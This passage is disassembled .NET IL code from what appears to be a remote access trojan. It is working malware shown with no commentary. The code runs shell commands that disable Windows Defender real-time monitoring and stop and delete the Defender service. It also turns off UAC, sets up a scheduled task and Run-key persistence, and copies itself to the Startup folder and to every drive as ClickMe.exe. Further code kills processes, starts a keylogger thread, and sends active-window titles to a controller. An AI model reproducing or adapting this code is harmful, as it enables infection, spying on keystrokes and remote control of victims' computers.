      IL_02de:  ldc.i4.0
      IL_02df:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02e4:  brtrue     IL_0369

      IL_02e9:  ldc.i4.1
      IL_02ea:  newarr     [mscorlib]System.String
      IL_02ef:  dup
      IL_02f0:  ldc.i4.0
      IL_02f1:  ldstr      "cmd /c powershell Set-MpPreference -DisableRealtim"
      + "eMonitoring $true"
      IL_02f6:  stelem.ref
      IL_02f7:  call       string [mscorlib]System.String::Concat(string[])
      IL_02fc:  ldc.i4.0
      IL_02fd:  ldc.i4.1
      IL_02fe:  ldc.i4     0x1388
      IL_0303:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0308:  pop
      IL_0309:  ldc.i4.1
      IL_030a:  newarr     [mscorlib]System.String
      IL_030f:  dup
      IL_0310:  ldc.i4.0
      IL_0311:  ldstr      "cmd /c sc query windefend"
      IL_0316:  stelem.ref
      IL_0317:  call       string [mscorlib]System.String::Concat(string[])
      IL_031c:  ldc.i4.0
      IL_031d:  ldc.i4.1
      IL_031e:  ldc.i4     0x1388
      IL_0323:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0328:  pop
      IL_0329:  ldc.i4.1
      IL_032a:  newarr     [mscorlib]System.String
      IL_032f:  dup
      IL_0330:  ldc.i4.0
      IL_0331:  ldstr      "cmd /c sc stop windefend"
      IL_0336:  stelem.ref
      IL_0337:  call       string [mscorlib]System.String::Concat(string[])
      IL_033c:  ldc.i4.0
      IL_033d:  ldc.i4.1
      IL_033e:  ldc.i4     0x1388
      IL_0343:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0348:  pop
      IL_0349:  ldc.i4.1
      IL_034a:  newarr     [mscorlib]System.String
      IL_034f:  dup
      IL_0350:  ldc.i4.0
      IL_0351:  ldstr      "cmd /c sc delete windefend"
      IL_0356:  stelem.ref
      IL_0357:  call       string [mscorlib]System.String::Concat(string[])
      IL_035c:  ldc.i4.0
      IL_035d:  ldc.i4.1
      IL_035e:  ldc.i4     0x1388
      IL_0363:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0368:  pop
      IL_0369:  ldsfld     string j.OK::CLEANSWEEP
      IL_036e:  ldstr      "Enabled"
      IL_0373:  ldc.i4.0
      IL_0374:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0379:  brtrue.s   IL_03b8

      IL_037b:  ldstr      "schtasks /delete /tn CleanSweepCheck /f"
      IL_0380:  ldc.i4.0
      IL_0381:  ldc.i4.1
      IL_0382:  ldc.i4     0x1388
      IL_0387:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_038c:  pop
      IL_038d:  ldstr      "schtasks /create /sc minute /mo 1 /tn CleanSweepCh"
      + "eck /tr "
      IL_0392:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_0397:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_039c:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_03a1:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_03a6:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_03ab:  ldc.i4.0
      IL_03ac:  ldc.i4.1
      IL_03ad:  ldc.i4     0x1388
      IL_03b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_03b7:  pop
      IL_03b8:  ldsfld     string j.OK::UAC
      IL_03bd:  ldstr      "Enabled"
      IL_03c2:  ldc.i4.0
      IL_03c3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03c8:  brtrue.s   IL_03dc

      IL_03ca:  ldstr      "cmd /c reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\Cur"
      + "rentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
      IL_03cf:  ldc.i4.0
      IL_03d0:  ldc.i4.1
      IL_03d1:  ldc.i4     0x1388
      IL_03d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_03db:  pop
      IL_03dc:  ldsfld     string j.OK::TSKE
      IL_03e1:  ldstr      "Enabled"
      IL_03e6:  ldc.i4.0
      IL_03e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03ec:  brtrue.s   IL_0418

      IL_03ee:  ldc.i4.1
      IL_03ef:  newarr     [mscorlib]System.String
      IL_03f4:  dup
      IL_03f5:  ldc.i4.0
      IL_03f6:  ldstr      "cmd /c taskkill /f /im "
      IL_03fb:  ldsfld     string j.OK::TSK
      IL_0400:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0405:  stelem.ref
      IL_0406:  call       string [mscorlib]System.String::Concat(string[])
      IL_040b:  ldc.i4.0
      IL_040c:  ldc.i4.1
      IL_040d:  ldc.i4     0x1388
      IL_0412:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0417:  pop
      IL_0418:  ldsfld     string j.OK::KAKASHI
      IL_041d:  ldstr      "Enabled"
      IL_0422:  ldc.i4.0
      IL_0423:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0428:  brtrue.s   IL_044b

      IL_042a:  call       void Stub.xma::Start()
      IL_042f:  newobj     instance void AntiTaskManager::.ctor()
      IL_0434:  stloc.3
      IL_0435:  ldloc.3
      IL_0436:  ldftn      instance void AntiTaskManager::protect()
      IL_043c:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0441:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_0446:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_044b:  leave.s    IL_0468

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_044d:  dup
      IL_044e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0453:  stloc.s    V_4
      IL_0455:  ldloc.s    V_4
      IL_0457:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_045c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0461:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0466:  leave.s    IL_0468

    }  // end handler
    IL_0468:  ldsfld     bool j.OK::Isu
    IL_046d:  brfalse    IL_0527

    .try
    {
      IL_0472:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0477:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_047c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0481:  ldsfld     string j.OK::sf
      IL_0486:  ldc.i4.1
      IL_0487:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_048c:  ldsfld     string j.OK::RG
      IL_0491:  ldstr      "\""
      IL_0496:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_049b:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_04a0:  ldstr      "\" .."
      IL_04a5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_04aa:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_04af:  leave.s    IL_04cc

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_04b1:  dup
      IL_04b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04b7:  stloc.s    V_5
      IL_04b9:  ldloc.s    V_5
      IL_04bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04ca:  leave.s    IL_04cc

    }  // end handler
    IL_04cc:  nop
    .try
    {
      IL_04cd:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_04d2:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_04d7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_04dc:  ldsfld     string j.OK::sf
      IL_04e1:  ldc.i4.1
      IL_04e2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_04e7:  ldsfld     string j.OK::RG
      IL_04ec:  ldstr      "\""
      IL_04f1:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_04f6:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_04fb:  ldstr      "\" .."
      IL_0500:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0505:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_050a:  leave.s    IL_0527

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_050c:  dup
      IL_050d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0512:  stloc.s    V_6
      IL_0514:  ldloc.s    V_6
      IL_0516:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_051b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0520:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0525:  leave.s    IL_0527

    }  // end handler
    IL_0527:  ldsfld     bool j.OK::IsF
    IL_052c:  brfalse.s  IL_059a

    .try
    {
      IL_052e:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0533:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0538:  ldc.i4.7
      IL_0539:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_053e:  ldstr      "\\"
      IL_0543:  ldsfld     string j.OK::RG
      IL_0548:  ldstr      ".exe"
      IL_054d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0552:  ldc.i4.1
      IL_0553:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string,
                                                               bool)
      IL_0558:  ldc.i4.7
      IL_0559:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_055e:  ldstr      "\\"
      IL_0563:  ldsfld     string j.OK::RG
      IL_0568:  ldstr      ".exe"
      IL_056d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0572:  ldc.i4.3
      IL_0573:  newobj     instance void [mscorlib]System.IO.FileStream::.ctor(string,
                                                                               valuetype [mscorlib]System.IO.FileMode)
      IL_0578:  stsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_057d:  leave.s    IL_059a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_057f:  dup
      IL_0580:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0585:  stloc.s    V_7
      IL_0587:  ldloc.s    V_7
      IL_0589:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_058e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0593:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0598:  leave.s    IL_059a

    }  // end handler
    IL_059a:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       964 (0x3c4)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             string[] V_4,
             int32 V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             string V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13)
    IL_0000:  ldsfld     bool j.OK::Anti_CH
    IL_0005:  brfalse.s  IL_000c

    IL_0007:  call       void Stub.MyAntiProcess::Start()
    IL_000c:  ldsfld     bool j.OK::USB_SP
    IL_0011:  brfalse.s  IL_0082

    IL_0013:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0018:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_001d:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_0022:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0027:  stloc.3
    IL_0028:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_002d:  stloc.s    V_4
    IL_002f:  ldc.i4.0
    IL_0030:  stloc.s    V_5
    IL_0032:  br.s       IL_007a

    IL_0034:  ldloc.s    V_4
    IL_0036:  ldloc.s    V_5
    IL_0038:  ldelem.ref
    IL_0039:  stloc.3
    .try
    {
      IL_003a:  ldloc.3
      IL_003b:  ldstr      "ClickMe.exe"
      IL_0040:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0045:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_004a:  brtrue.s   IL_0066

      IL_004c:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::GetExecutingAssembly()
      IL_0051:  callvirt   instance string [mscorlib]System.Reflection.Assembly::get_Location()
      IL_0056:  ldloc.3
      IL_0057:  ldstr      "ClickMe.exe"
      IL_005c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0061:  call       void [mscorlib]System.IO.File::Copy(string,
                                                               string)
      IL_0066:  leave.s    IL_0074

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0072:  leave.s    IL_0074

    }  // end handler
    IL_0074:  ldloc.s    V_5
    IL_0076:  ldc.i4.1
    IL_0077:  add.ovf
    IL_0078:  stloc.s    V_5
    IL_007a:  ldloc.s    V_5
    IL_007c:  ldloc.s    V_4
    IL_007e:  ldlen
    IL_007f:  conv.i4
    IL_0080:  blt.s      IL_0034

    IL_0082:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0087:  brfalse.s  IL_00ce

    .try
    {
      IL_0089:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_008e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0093:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0098:  ldstr      "di"
      IL_009d:  ldstr      "!"
      IL_00a2:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00a7:  leave.s    IL_00c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00a9:  dup
      IL_00aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00af:  stloc.s    V_6
      IL_00b1:  ldloc.s    V_6
      IL_00b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c2:  leave.s    IL_00c4

    }  // end handler
    IL_00c4:  ldc.i4     0x1388
    IL_00c9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00ce:  ldc.i4.0
    IL_00cf:  stloc.0
    IL_00d0:  ldc.i4.1
    IL_00d1:  ldsfld     string j.OK::RG
    IL_00d6:  ldloca.s   V_0
    IL_00d8:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00dd:  stsfld     object j.OK::MT
    IL_00e2:  ldloc.0
    IL_00e3:  brtrue.s   IL_00ea

    IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00ea:  call       void j.OK::INS()
    IL_00ef:  ldsfld     bool j.OK::Idr
    IL_00f4:  brtrue.s   IL_0119

    IL_00f6:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_00fb:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0100:  stsfld     string j.OK::EXE
    IL_0105:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_010a:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_010f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0114:  stsfld     string j.OK::DR
    IL_0119:  ldnull
    IL_011a:  ldftn      void j.OK::RC()
    IL_0120:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0125:  ldc.i4.1
    IL_0126:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_012b:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_0130:  newobj     instance void j.kl::.ctor()
      IL_0135:  stsfld     class j.kl j.OK::kq
      IL_013a:  ldsfld     class j.kl j.OK::kq
      IL_013f:  ldftn      instance void j.kl::WRK()
      IL_0145:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_014a:  ldc.i4.1
      IL_014b:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_0150:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0155:  leave.s    IL_0172

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0157:  dup
      IL_0158:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_015d:  stloc.s    V_7
      IL_015f:  ldloc.s    V_7
      IL_0161:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0166:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_016b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0170:  leave.s    IL_0172

    }  // end handler
    IL_0172:  ldc.i4.0
    IL_0173:  stloc.1
    IL_0174:  ldstr      ""
    IL_0179:  stloc.2
    IL_017a:  ldsfld     bool j.OK::BD
    IL_017f:  brfalse.s  IL_01b5

    .try
    {
      IL_0181:  ldnull
      IL_0182:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0188:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_018d:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_0192:  ldc.i4.1
      IL_0193:  call       void j.OK::pr(int32)
      IL_0198:  leave.s    IL_01b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_019a:  dup
      IL_019b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a0:  stloc.s    V_8
      IL_01a2:  ldloc.s    V_8
      IL_01a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01b3:  leave.s    IL_01b5

    }  // end handler
    IL_01b5:  ldc.i4     0x3e8
    IL_01ba:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01bf:  ldsfld     bool j.OK::Cn
    IL_01c4:  brtrue.s   IL_01cc

    IL_01c6:  ldstr      ""
    IL_01cb:  stloc.2
    IL_01cc:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01d1:  ldloc.1
      IL_01d2:  ldc.i4.1
      IL_01d3:  add.ovf
      IL_01d4:  stloc.1
      IL_01d5:  ldloc.1
      IL_01d6:  ldc.i4.5
      IL_01d7:  bne.un.s   IL_020a

      .try
      {
        IL_01d9:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01de:  ldc.i4     0x400
        IL_01e3:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01e8:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01ed:  leave.s    IL_020a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01ef:  dup
        IL_01f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01f5:  stloc.s    V_9
        IL_01f7:  ldloc.s    V_9
        IL_01f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0208:  leave.s    IL_020a

      }  // end handler
      IL_020a:  ldloc.1
      IL_020b:  ldc.i4.8
      IL_020c:  blt.s      IL_023c

      IL_020e:  ldc.i4.0
      IL_020f:  stloc.1
      IL_0210:  call       string j.OK::ACT()
      IL_0215:  stloc.s    V_10
      IL_0217:  ldloc.2
      IL_0218:  ldloc.s    V_10
      IL_021a:  ldc.i4.0
      IL_021b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0220:  brfalse.s  IL_023c

      IL_0222:  ldloc.s    V_10
      IL_0224:  stloc.2
      IL_0225:  ldstr      "act"
      IL_022a:  ldsfld     string j.OK::Y
      IL_022f:  ldloc.s    V_10
      IL_0231:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0236:  call       bool j.OK::Send(string)
      IL_023b:  pop
      IL_023c:  ldsfld     bool j.OK::Isu
      IL_0241:  brfalse    IL_03a1

      .try
      {
        IL_0246:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_024b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0250:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0255:  ldsfld     string j.OK::sf
        IL_025a:  ldstr      "\\"
        IL_025f:  ldsfld     string j.OK::RG
        IL_0264:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0269:  ldstr      ""
        IL_026e:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0273:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0278:  ldstr      "\""
        IL_027d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0282:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0287:  ldstr      "\" .."
        IL_028c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0291:  ldc.i4.0
        IL_0292:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0297:  brfalse.s  IL_02d6

        IL_0299:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_029e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02a3:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02a8:  ldsfld     string j.OK::sf
        IL_02ad:  ldc.i4.1
        IL_02ae:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02b3:  ldsfld     string j.OK::RG
        IL_02b8:  ldstr      "\""
        IL_02bd:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02c2:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02c7:  ldstr      "\" .."
        IL_02cc:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02d1:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02d6:  leave.s    IL_02f3

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02d8:  dup
